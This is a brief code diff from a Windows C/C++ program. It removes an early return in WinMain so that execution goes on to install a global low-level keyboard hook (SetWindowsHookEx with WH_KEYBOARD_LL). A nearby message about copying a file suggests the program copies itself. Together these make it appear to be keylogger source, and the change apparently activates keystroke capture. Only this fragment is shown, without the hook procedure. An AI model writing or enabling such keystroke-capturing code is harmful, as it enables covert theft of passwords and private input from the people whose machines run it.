@@ -74,7 +74,6 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     } else {
         printf("Could not copy file again!\n");
     }
-    return 0;
 
     HINSTANCE app = GetModuleHandle(nullptr);
     SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, app, 0);
